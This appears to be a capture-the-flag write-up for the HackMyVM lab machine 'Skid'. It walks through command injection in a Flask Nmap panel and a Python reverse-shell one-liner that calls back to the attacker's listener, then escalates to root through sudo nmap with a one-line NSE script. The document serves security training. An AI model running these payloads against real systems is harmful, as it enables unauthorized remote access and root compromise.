# Skid

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Skid | zedd9001 | Beginner | HackMyVM |

**Summary:** Skid is a beginner-level HackMyVM machine featuring a Python Flask web application with a command injection vulnerability. The machine exposes SSH and a custom web application on port 5000 called "Jeremy's Ultimate Hacker Panel" that includes an Nmap scanner functionality vulnerable to OS command injection. Initial access is gained by exploiting this RCE vulnerability to obtain a reverse shell as the user `jeremy`. Privilege escalation is achieved by leveraging sudo privileges on the `nmap` binary, which can execute NSE (Nmap Scripting Engine) scripts containing arbitrary Lua code that can spawn a root shell.

---

## Reconnaissance

### Network Discovery
Initial network scanning revealed the target machine at IP address 192.168.100.38:

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
...
[+] Virtual Targets Found:
------------------------------------------------------------

IP             MAC               Vendor
--             ---               ------
192.168.100.38 08:00:27:3C:E3:C4 VirtualBox
```

### Port Scanning
A comprehensive Nmap scan was performed to identify open services:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ nmap -sCV -p- 192.168.100.38
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-27 15:31 WIB
Nmap scan report for 192.168.100.38
Host is up (0.012s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 8e:4d:46:ba:2a:04:65:08:e2:85:09:7d:e6:1a:d7:b3 (RSA)
|   256 52:f9:f6:8a:3a:21:05:84:20:01:4f:fd:bd:17:24:44 (ECDSA)
|_  256 db:87:52:e5:d3:ff:2b:92:e8:f2:91:0a:85:63:33:db (ED25519)
5000/tcp open  http    Werkzeug httpd 3.0.6 (Python 3.8.10)
|_http-title: Jeremy's Hacker Panel
|_http-server-header: Werkzeug/3.0.6 Python/3.8.10
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.40 seconds
```

The scan revealed two open ports:
- **Port 22**: OpenSSH 8.2p1 (Ubuntu)
- **Port 5000**: Werkzeug HTTP server running Python 3.8.10 with the title "Jeremy's Hacker Panel"

### Web Enumeration
Directory enumeration was performed using Feroxbuster to discover additional web endpoints:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ feroxbuster -u http://192.168.100.38:5000/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,txt,html,bak,zip,gif -t 50

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.100.38:5000/
 🚩  In-Scope Url          │ 192.168.100.38
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, txt, html, bak, zip, gif]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       30l       39w      463c http://192.168.100.38:5000/scan
200      GET       35l       44w      522c http://192.168.100.38:5000/payload
200      GET       78l      158w     1245c http://192.168.100.38:5000/static/style.css
200      GET       28l       52w      541c http://192.168.100.38:5000/
```

The enumeration discovered several endpoints:
- `/` - Main homepage (541 bytes)
- `/scan` - Nmap scanner functionality (463 bytes)  
- `/payload` - Reverse shell generator (522 bytes)
- `/static/style.css` - CSS stylesheet (1245 bytes)

### Web Application Analysis
Manual examination of the discovered web application revealed a hacker-themed panel with three main functionalities.

**Homepage (`/`):**
![](image.png)

The homepage displays "Jeremy's Ultimate Hacker Panel" with the tagline "Only real hackers are allowed in my site" and contains navigation links to "Run Nmap Scan" and "Generate Reverse Shell" functionalities.

**Nmap Scanner (`/scan`):**
![](image-1.png)

The scan endpoint provides an interface for running Nmap scans with a target input field and scan button.

**Reverse Shell Generator (`/payload`):**
![](image-2.png)

The payload endpoint offers a reverse shell generator with IP and Port input fields for creating reverse shell payloads.

---

## Initial Access

### Command Injection Discovery
Testing the `/scan` endpoint for potential command injection vulnerabilities by injecting the `; id` command into the target field:

![](image-3.png)

The injection was successful, revealing command execution with the following output:
```
Starting Nmap 7.80 ( https://nmap.org ) at 2026-01-27 08:36 UTC
Nmap done: 0 IP addresses (0 hosts up) scanned in 0.48 seconds
uid=1000(jeremy) gid=1000(jeremy) groups=1000(jeremy)
WARNING: No targets were specified, so 0 hosts scanned.

# Nmap 7.80 scan initiated Tue Jan 27 08:36:23 2026 as: nmap -T4 -oN /tmp/scan.txt
WARNING: No targets were specified, so 0 hosts scanned.
# Nmap done at Tue Jan 27 08:36:23 2026 -- 0 IP addresses (0 hosts up) scanned in 0.48 seconds
```

This confirmed remote code execution (RCE) capability on the target system, running commands as the user `jeremy`.

### Reverse Shell Exploitation
With command injection confirmed, a Python-based reverse shell payload was crafted to establish a persistent connection:

**Payload Used:**
```bash
; python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.100.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

**Netcat Listener Setup:**
```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

**Successful Connection:**
```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 65529
jeremy@skid:~$ id
id
uid=1000(jeremy) gid=1000(jeremy) groups=1000(jeremy)
jeremy@skid:~$
```

### Shell Stabilization
The reverse shell was upgraded to a fully interactive PTY for better functionality:

```bash
jeremy@skid:~$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
jeremy@skid:~$ ^Z
zsh: suspended  nc -lvnp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444

jeremy@skid:~$ reset
jeremy@skid:~$ export TERM=xterm
jeremy@skid:~$ export SHELL=bash
```

---

## Privilege Escalation

### Sudo Privilege Analysis
Checking sudo privileges for the current user:

```bash
jeremy@skid:~$ sudo -l
Matching Defaults entries for jeremy on skid:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jeremy may run the following commands on skid:
    (root) NOPASSWD: /usr/bin/nmap
jeremy@skid:~$ ls -la /usr/bin/nmap
-rwxr-xr-x 1 root root 3026928 Jan 30  2023 /usr/bin/nmap
```

The user `jeremy` has sudo privileges to run `/usr/bin/nmap` as root without password authentication.

### Nmap Version and Capabilities Assessment
Checking the available Nmap version and its capabilities:

```bash
jeremy@skid:~$ sudo /usr/bin/nmap --help
Nmap 7.80 ( https://nmap.org )
Usage: nmap [Scan Type(s)] [Options] {target specification}
...
SCRIPT SCAN:
  -sC: equivalent to --script=default
  --script=<Lua scripts>: <Lua scripts> is a comma separated list of
           directories, script-files or script-categories
  --script-args=<n1=v1,[n2=v2,...]>: provide arguments to scripts
  --script-args-file=filename: provide NSE script args in a file
  --script-trace: Show all data sent and received
  --script-updatedb: Update the script database.
  --script-help=<Lua scripts>: Show help about scripts.
           <Lua scripts> is a comma-separated list of script-files or
           script-categories.
...
```

The version (7.80) supports NSE (Nmap Scripting Engine) scripts, which can execute Lua code with the privileges of the nmap process.

### NSE Script Exploitation
Creating a malicious NSE script to execute arbitrary commands:

```bash
jeremy@skid:~$ echo 'os.execute("/bin/bash")' > /tmp/pwn.nse
jeremy@skid:~$ sudo /usr/bin/nmap --script=/tmp/pwn.nse
root@skid:/home/jeremy# id
uid=0(root) gid=0(root) groups=0(root)
root@skid:/home/jeremy#
```

The NSE script successfully executed `/bin/bash` with root privileges, escalating from the `jeremy` user to `root`.

### Flag Retrieval
Locating and retrieving the user and root flags:

```bash
root@skid:/home/jeremy# cat /root/root.txt user.txt
Help I lost the root flag!
Can you please help me find it?
hmv{760[REDACTED]}
root@skid:/home/jeremy# find / -type f -name "root*" 2>/dev/null
/usr/src/linux-headers-5.4.0-193-generic/include/config/eisa/virtual/root.h
...
/var/lib/.cache2/root.txt
/root/root.txt
root@skid:/home/jeremy# cat /var/lib/.cache2/root.txt
hmv{182[REDACTED]}
```

---

## Attack Chain Summary

1. **Reconnaissance**: Performed network discovery and identified target at 192.168.100.38 with SSH (port 22) and HTTP (port 5000) services
2. **Vulnerability Discovery**: Enumerated web application revealing "Jeremy's Ultimate Hacker Panel" with Nmap scanner functionality susceptible to command injection
3. **Exploitation**: Leveraged OS command injection in the `/scan` endpoint using `; id` payload, then escalated to reverse shell using Python payload
4. **Internal Enumeration**: Stabilized shell and discovered sudo privileges allowing execution of `/usr/bin/nmap` as root without password
5. **Privilege Escalation**: Created malicious NSE script containing `os.execute("/bin/bash")` and executed with sudo nmap to gain root shell, ultimately retrieving both user and root flags